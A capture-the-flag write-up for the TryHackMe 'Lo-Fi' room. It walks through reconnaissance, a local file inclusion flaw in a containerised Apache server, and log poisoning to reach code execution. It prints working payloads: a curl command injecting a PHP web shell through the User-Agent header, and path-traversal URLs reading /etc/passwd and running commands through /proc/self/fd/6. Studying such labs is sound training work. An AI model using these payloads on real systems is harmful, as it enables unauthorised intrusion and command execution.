---
tags:
  - thm
  - easy
  - log-poisoning
  - docker
  - web-exploitation
  - apache
Scenario: Exploiting a Local File Inclusion (LFI) vulnerability in a legacy Apache Docker container to gain RCE via Log Poisoning (`/proc/self/fd/`).
Link: https://tryhackme.com/room/lofi
---
## Quick Reference (TL;DR)

### Key Concepts & Tricks
1.  **Docker Detection:** A mismatch between service versions (e.g., Modern SSH vs. Ancient Apache) often indicates the service is running inside a container.
2.  **Container Log Poisoning:** In Docker, standard logs (`/var/log/apache2`) are often redirected to `stdout/stderr`. If standard LFI paths fail, check **File Descriptors**:
    * `/proc/self/fd/6` (Common for Apache access logs in containers)
    * `/proc/self/fd/8` or `/proc/self/fd/10`
3.  **User-Agent Injection:** Since we can't upload files, we inject PHP code into the `User-Agent` HTTP header, which gets written to the server logs.

### Key Commands
```bash
# 1. Log Poisoning Payload (Inject PHP Shell)
# Note: Escape the $ with \ for shell commands
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET_IP/

# 2. Execute RCE via LFI
# Access the log file (fd/6) and pass the command param
http://TARGET_IP/?page=../../../../proc/self/fd/6&cmd=ls -la /
```

---

## Detailed Walkthrough

### 1. Reconnaissance

We started with a standard Nmap scan to identify open ports and services.

**Command:**
```bash
nmap -A -T4 <TARGET_IP>
```

- **`-A`**: Aggressive scan (OS detection, version detection, script scanning, traceroute).
- **`-T4`**: Set timing template to "Aggressive" (faster speed).

**Results:**
- **Port 22 (SSH):** OpenSSH 8.2p1 (Ubuntu).
- **Port 80 (HTTP):** Apache httpd **2.2.22**.
- **Implication:** The mismatch between the modern SSH version (2020) and the ancient Apache version (2012) strongly suggests the web server is running inside a **Docker container** to support legacy software.

### 2. Web Enumeration

We visited the website (`http://<TARGET_IP>`). It appeared to be a simple music player.

**Discovery:**
- **Directory Brute-force:** Gobuster found only `index.php`.
- **Source Code Analysis:** Viewing the source (`Ctrl+U`) revealed a navigation menu using a query parameter:
  ```html
    <li><a href="/?page=relax.php">Relax</a></li>
    ```
- **Implication:** The `?page=` parameter suggests the server dynamically includes files based on user input, a classic indicator of **LFI (Local File Inclusion)**.

### 3. Vulnerability Verification (LFI)

We tested for "Path Traversal" to confirm we could read system files outside the web directory.

**Payload:**
```plaintext
http://<TARGET_IP>/?page=../../../../etc/passwd
```

**Results:**
- **Success:** We could read the `/etc/passwd` file.
- **Environment Analysis:** The file ended with `libuuid` and lacked a standard human user (UID 1000).
- **Implication:** The absence of a standard user account confirmed we were inside a minimal **Docker container**. This meant the flag would likely be in the root `/` directory rather than a user's home folder.

### 4. Exploitation: Log Poisoning to RCE
Since file upload was not possible, we used **Log Poisoning**. Since we are in a container, standard logs (`/var/log/apache2`) were empty. We targeted the process file descriptors instead.

**The Attack Vector:**
- **Target File:** `/proc/self/fd/6` (The file descriptor where the container outputs Apache logs).
- **Method:** Inject PHP code into the `User-Agent` header so it gets saved in the log, then include that log file via LFI.

**Execution:**
We crafted a specific payload compatible with `zsh` (Mac terminal) to avoid breaking the PHP syntax with double quotes.

**Command:**
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET_IP>/
```
- **Mechanism:** The server records our malicious User-Agent into `/proc/self/fd/6`.
- **Note:** We used single quotes `'cmd'` inside the PHP to prevent Apache/Shell parsing errors.

### 5. Post-Exploitation & Flag Capture
With the backdoor active, we executed system commands using the `&cmd=` parameter.

**Listing Files:**
We checked the root directory / because /home was empty.
```plaintext
http://<TARGET_IP>/?page=../../../../proc/self/fd/6&cmd=ls -la /
```
**Result:** Found `flag.txt`.

**Reading the Flag:**
```plaintext
http://<TARGET_IP>/?page=../../../../proc/self/fd/6&cmd=cat /flag.txt
```